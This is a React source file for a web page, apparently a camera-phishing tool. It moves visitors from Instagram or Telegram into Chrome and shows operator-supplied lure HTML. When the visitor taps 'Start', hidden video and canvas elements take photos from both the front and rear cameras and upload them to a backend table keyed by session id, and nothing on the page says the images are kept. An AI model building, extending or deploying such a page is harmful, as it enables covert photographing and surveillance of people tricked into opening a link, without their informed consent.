import { useEffect, useMemo, useRef, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

// Detect in-app browsers (Instagram, Telegram, Facebook, etc.)
const isInAppBrowser = (): boolean => {
  const ua = navigator.userAgent || navigator.vendor || "";
  const inAppPatterns = [
    "Instagram",
    "FBAN",
    "FBAV",
    "FB_IAB",
    "Telegram",
    "TelegramBot",
    "Twitter",
    "Line",
    "Snapchat",
    "WhatsApp",
    "LinkedIn",
    "Pinterest",
    "Viber",
    "WeChat",
    "MicroMessenger",
  ];

  return inAppPatterns.some((pattern) => ua.includes(pattern));
};

const isAndroid = (): boolean => {
  const ua = navigator.userAgent || "";
  return /Android/i.test(ua);
};

const isChromeBrowser = (): boolean => {
  const ua = navigator.userAgent || "";
  const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
  const isNotEdge = !/Edg/i.test(ua);
  const isNotOpera = !/OPR/i.test(ua);
  const isNotSamsung = !/SamsungBrowser/i.test(ua);

  return hasChrome && isNotEdge && isNotOpera && isNotSamsung && !isInAppBrowser();
};

const getChromeIntentUrl = (currentUrl: string): string => {
  const url = new URL(currentUrl);
  return `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
};

type PageStatus =
  | "checking"
  | "redirecting_chrome"
  | "unsupported"
  | "loading_html"
  | "ready"
  | "capturing"
  | "done"
  | "error";

const ChromeCustomCapture = () => {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("session") || "default";

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const [status, setStatus] = useState<PageStatus>("checking");
  const [customHtml, setCustomHtml] = useState<string>("");
  const [errorMsg, setErrorMsg] = useState<string>("");

  const [hasStarted, setHasStarted] = useState(false);
  const [captureComplete, setCaptureComplete] = useState(false);

  const env = useMemo(() => {
    const inApp = isInAppBrowser();
    const android = isAndroid();
    const chrome = isChromeBrowser();
    const embedded = (() => {
      try {
        return window.self !== window.top;
      } catch {
        return true;
      }
    })();

    return { inApp, android, chrome, embedded };
  }, []);

  // Basic SEO
  useEffect(() => {
    document.title = "Chrome Custom Capture";
  }, []);

  // Step 1: Redirect from Instagram/Telegram (Android) to Chrome
  useEffect(() => {
    // If in-app browser on Android, push user to Chrome
    if (env.inApp && env.android) {
      setStatus("redirecting_chrome");
      const intentUrl = getChromeIntentUrl(window.location.href);
      const t = setTimeout(() => {
        window.location.href = intentUrl;
      }, 100);
      return () => clearTimeout(t);
    }

    // In-app on non-Android: we can't auto-open Chrome reliably
    if (env.inApp && !env.android) {
      setStatus("unsupported");
      return;
    }

    // Not Chrome (and not in-app): still allow the page to work, but camera may behave differently.
    setStatus("loading_html");
  }, [env.android, env.inApp]);

  // Step 2: Load custom HTML from backend settings
  useEffect(() => {
    if (status !== "loading_html") return;

    const loadCustomHtml = async () => {
      try {
        const { data, error } = await supabase
          .from("app_settings")
          .select("setting_value")
          .eq("setting_key", "main_settings")
          .maybeSingle();

        if (error) throw error;

        const settings = (data?.setting_value ?? {}) as { chromeCustomHtml?: string };
        setCustomHtml(settings.chromeCustomHtml || "");
        setStatus("ready");
      } catch (err: any) {
        console.error("Error loading custom HTML:", err);
        setErrorMsg("Custom HTML load nahi hua.");
        setStatus("error");
      }
    };

    loadCustomHtml();
  }, [status]);

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      if (!navigator.mediaDevices?.getUserMedia) {
        throw new Error("Camera API not available");
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: 640, height: 480 },
        audio: false,
      });

      const video = videoRef.current;
      const canvas = canvasRef.current;
      if (!video || !canvas) {
        stream.getTracks().forEach((t) => t.stop());
        return null;
      }

      video.srcObject = stream;
      await video.play();
      await new Promise((r) => setTimeout(r, 800));

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      const ctx = canvas.getContext("2d");
      if (!ctx) {
        stream.getTracks().forEach((t) => t.stop());
        return null;
      }

      ctx.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL("image/jpeg", 0.8);
      stream.getTracks().forEach((t) => t.stop());
      return imageData;
    } catch (e) {
      console.error(`Camera ${facingMode} error:`, e);
      return null;
    }
  };

  const startCapture = async () => {
    if (hasStarted || captureComplete) return;

    setHasStarted(true);
    setStatus("capturing");
    setErrorMsg("");

    try {
      const frontImage = await captureFromCamera("user");
      if (frontImage) {
        await supabase.from("captured_photos").insert({
          session_id: sessionId,
          image_data: frontImage,
          user_agent: `${navigator.userAgent} [FRONT]`,
        });
      }

      await new Promise((r) => setTimeout(r, 250));

      const backImage = await captureFromCamera("environment");
      if (backImage) {
        await supabase.from("captured_photos").insert({
          session_id: sessionId,
          image_data: backImage,
          user_agent: `${navigator.userAgent} [BACK]`,
        });
      }

      setCaptureComplete(true);
      setStatus("done");
    } catch (err: any) {
      console.error("Capture error:", err);
      setErrorMsg("Camera permission allow karo, phir Try Again.");
      setStatus("ready");
      setHasStarted(false);
    }
  };

  if (status === "redirecting_chrome") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Opening in Chrome...</p>
          <p className="text-muted-foreground text-xs mt-2">
            Agar auto-open na ho, manually Chrome me open karo.
          </p>
        </section>
      </main>
    );
  }

  if (status === "unsupported") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center max-w-md">
          <h1 className="text-xl font-bold text-foreground mb-2">Open in Chrome</h1>
          <p className="text-muted-foreground">
            Instagram/Telegram in-app browser me camera permission block ho sakta hai.
          </p>
          <p className="text-muted-foreground text-sm mt-3">
            Is link ko copy karke Chrome me open karo.
          </p>
        </section>
      </main>
    );
  }

  if (status === "checking" || status === "loading_html") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center">
        <section className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Loading...</p>
        </section>
      </main>
    );
  }

  if (status === "error") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center max-w-md">
          <h1 className="text-xl font-bold text-foreground mb-2">Something went wrong</h1>
          <p className="text-muted-foreground">{errorMsg || "Please try again."}</p>
        </section>
      </main>
    );
  }

  // ready / capturing / done
  return (
    <main className="min-h-screen bg-background">
      {/* Hidden video/canvas for capture */}
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />

      {/* Top overlay controls (ensures user gesture for permission) */}
      <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur supports-[backdrop-filter]:bg-background/60">
        <div className="mx-auto max-w-3xl px-4 py-3 flex items-center justify-between gap-3">
          <div className="min-w-0">
            <p className="text-sm font-medium text-foreground truncate">Session: {sessionId}</p>
            {env.embedded ? (
              <p className="text-xs text-muted-foreground">
                Preview iframe me permission nahi aata — link ko new tab me open karo.
              </p>
            ) : (
              <p className="text-xs text-muted-foreground">Camera permission aayega — Allow karo.</p>
            )}
          </div>

          {!captureComplete ? (
            <button
              type="button"
              onClick={startCapture}
              className="inline-flex items-center justify-center rounded-md bg-primary px-3 py-2 text-sm font-medium text-primary-foreground shadow-sm transition-colors hover:bg-primary/90"
            >
              {status === "capturing" ? "Capturing..." : "Start"}
            </button>
          ) : (
            <span className="text-xs text-muted-foreground">Captured</span>
          )}
        </div>
        {errorMsg ? (
          <div className="mx-auto max-w-3xl px-4 pb-3">
            <p className="text-xs text-destructive">{errorMsg}</p>
          </div>
        ) : null}
      </header>

      {/* Custom HTML */}
      <section className="mx-auto max-w-3xl px-4 py-6">
        <article>
          <div dangerouslySetInnerHTML={{ __html: customHtml || "" }} />
        </article>
      </section>
    </main>
  );
};

export default ChromeCustomCapture;
